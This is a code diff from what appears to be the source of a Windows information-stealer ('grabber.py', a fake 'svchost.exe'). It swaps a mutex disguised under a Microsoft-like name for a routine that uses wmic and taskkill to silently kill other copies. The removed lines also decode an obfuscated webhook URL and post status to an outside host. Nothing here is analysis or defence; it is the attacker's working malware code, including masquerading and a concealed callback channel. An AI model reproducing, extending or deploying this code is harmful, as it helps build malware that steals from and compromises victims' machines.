@@ -226,33 +226,25 @@ def _get_script_path() -> str:
     except Exception:
         return sys.executable
 
-# â”€â”€â”€ MUTEX (prevent double execution) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-def _create_mutex() -> bool:
-    """Create a named mutex. Returns True if we're the first instance."""
-    name = "Global\\MicrosoftNetworkSync_8B4E"
-    if _is_admin():
-        name += "_Elevated"
-    
+# â”€â”€â”€ KILL PREVIOUS INSTANCES (FORCE RESTART) â”€â”€â”€â”€â”€â”€â”€
+def _kill_previous_instances():
     try:
-        k32 = ctypes.windll.kernel32
-        k32.CreateMutexA(None, False, name.encode())
-        return k32.GetLastError() != 183  # ERROR_ALREADY_EXISTS
-    except Exception:
-        return True  # assume ok if ctypes fails
-
-if not _create_mutex():
-    # â”€â”€ Another instance is already running â€” notify and die â”€â”€
-    try:
-        import urllib.request as _ureq, json as _js
-        _wh = _d("Iz8/OzhxZGQvIjgoJDkvZSgkJmQqOyJkPC4pIyQkIDhken5+f3NzeX58c398fXp8cn57fWQ7ehsHBg4sESN4BTExfzg6OQYpEyAjEjoxOHsYHC0aHgl6AzlyHy0hAxoPPj0Bey8lZiozGCYbBQIMBi4FMTo5AS4cEQ==")
-        _payload = _js.dumps({"username": "DEBUG", "content": "âš ï¸ **MUTEX BLOCKED** â€” Another instance is already running. This copy is exiting. (To re-run, kill the existing pythonw/svchost process first.)"}).encode()
-        _rq = _ureq.Request(_wh, data=_payload, headers={"Content-Type": "application/json"})
-        _ureq.urlopen(_rq, timeout=5)
+        import subprocess, os
+        my_pid = str(os.getpid())
+        # Tenta matar outros processos rodando o ms.py ou grabber.py ou svchost.exe fake
+        out = subprocess.run('wmic process where "name like \'%python%\' or name=\'svchost.exe\'" get processid,commandline', shell=True, capture_output=True).stdout.decode(errors='ignore')
+        for line in out.splitlines():
+            line_lower = line.lower()
+            if "ms.py" in line_lower or "grabber.py" in line_lower or "svchost.exe" in line_lower:
+                parts = line.split()
+                if parts:
+                    pid = parts[-1]
+                    if pid.isdigit() and pid != my_pid:
+                        subprocess.run(f'taskkill /F /PID {pid}', shell=True, capture_output=True, creationflags=0x08000000)
     except Exception:
         pass
-    import sys
-    sys.exit(0)
 
+_kill_previous_instances()
 
 # â”€â”€â”€ WAIT FOR INTERNET â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 def _wait_for_internet(timeout: int = 120, interval: int = 5) -> bool:
